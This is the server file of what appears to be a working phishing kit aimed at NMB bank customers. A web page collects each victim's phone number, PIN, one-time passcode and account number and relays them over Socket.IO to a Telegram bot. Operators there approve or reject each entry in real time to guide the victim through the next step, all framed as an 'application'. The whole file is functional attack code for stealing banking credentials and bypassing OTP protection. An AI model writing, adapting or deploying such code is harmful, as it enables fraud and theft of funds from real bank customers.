// server.js
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const MAIN_ADMIN_ID = process.env.ADMIN_CHAT_ID;

const bot = new TelegramBot(TOKEN, { polling: true });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Store active sessions: socketId -> session data
const sessions = {};
// Store authorized sub-admins: Set of chat IDs
const subAdmins = new Set([MAIN_ADMIN_ID]);

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id.toString();
  
  if (chatId === MAIN_ADMIN_ID) {
    bot.sendMessage(chatId, `Welcome Main Admin. Your private tracking link: \nhttps://t.me/${bot.options.username}?start=${chatId}`);
  } else {
    subAdmins.add(chatId);
    bot.sendMessage(chatId, `Sub-Admin access registered. Your chat ID is: ${chatId}`);
  }
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  const [action, socketId] = data.split('_');

  if (!sessions[socketId]) {
    await bot.answerCallbackQuery(query.id, { text: 'Session expired or invalid.' });
    return;
  }

  const socket = io.sockets.sockets.get(socketId);

  switch (action) {
    case 'allow':
      sessions[socketId].step = 'otp';
      if (socket) socket.emit('admin_response', { status: 'allowed', message: 'correct PIN' });
      await bot.editMessageText('Approved PIN & Number. Waiting for OTP submission...', { chat_id: chatId, message_id: query.message.message_id });
      break;

    case 'deny':
      sessions[socketId].step = 'fresh';
      if (socket) socket.emit('admin_response', { status: 'deny', message: 'Request denied. Starting fresh.' });
      await bot.editMessageText('Request DENIED. Applicant reset.', { chat_id: chatId, message_id: query.message.message_id });
      break;

    case 'wrongpin':
      if (socket) socket.emit('admin_response', { status: 'wrong_pin', message: 'wrong PIN' });
      await bot.editMessageText('Marked as WRONG PIN. Redirected applicant.', { chat_id: chatId, message_id: query.message.message_id });
      break;

    case 'wrongotp':
      if (socket) socket.emit('admin_response', { status: 'wrong_otp', message: 'wrong OTP' });
      await bot.editMessageText('Marked as WRONG OTP. Redirected applicant.', { chat_id: chatId, message_id: query.message.message_id });
      break;

    case 'correctotp':
      sessions[socketId].step = 'account';
      if (socket) socket.emit('admin_response', { status: 'correct_otp', message: 'correct OTP' });
      await bot.editMessageText('OTP Correct. Waiting for NMB Account Number...', { chat_id: chatId, message_id: query.message.message_id });
      break;

    case 'invalidacc':
      if (socket) socket.emit('admin_response', { status: 'invalid_acc', message: 'Invalid Account Number. Enter new.' });
      await bot.editMessageText('Account marked INVALID. Prompted for new number.', { chat_id: chatId, message_id: query.message.message_id });
      break;

    case 'validacc':
      sessions[socketId].step = 'success';
      if (socket) socket.emit('admin_response', { status: 'valid_acc', message: 'correct ACC' });
      await bot.editMessageText('Account VALIDATED. Success screen reached.', { chat_id: chatId, message_id: query.message.message_id });
      break;
  }
  await bot.answerCallbackQuery(query.id);
});

io.on('connection', (socket) => {
  sessions[socket.id] = { step: 'initial' };

  socket.on('submit_pin', async (data) => {
    sessions[socket.id].data = data;
    const msg = `New Application Submission:\nPhone: ${data.phone}\nPIN: ${data.pin}`;
    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'ALLOW', callback_data: `allow_${socket.id}` },
            { text: 'DENY', callback_data: `deny_${socket.id}` }
          ]
        ]
      }
    };
    broadcastToAdmins(msg, opts);
  });

  socket.on('submit_otp', async (data) => {
    const msg = `OTP Submitted: ${data.otp}`;
    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'WRONG PIN', callback_data: `wrongpin_${socket.id}` },
            { text: 'WRONG OTP', callback_data: `wrongotp_${socket.id}` }
          ],
          [
            { text: 'CORRECT OTP', callback_data: `correctotp_${socket.id}` }
          ]
        ]
      }
    };
    broadcastToAdmins(msg, opts);
  });

  socket.on('submit_account', async (data) => {
    const msg = `NMB Account Number Submitted: ${data.account}`;
    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'INVALID ACC.', callback_data: `invalidacc_${socket.id}` },
            { text: 'VALID ACC.', callback_data: `validacc_${socket.id}` }
          ]
        ]
      }
    };
    broadcastToAdmins(msg, opts);
  });

  socket.on('disconnect', () => {
    delete sessions[socket.id];
  });
});

function broadcastToAdmins(text, options) {
  subAdmins.forEach((adminId) => {
    bot.sendMessage(adminId, text, options).catch(() => {});
  });
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
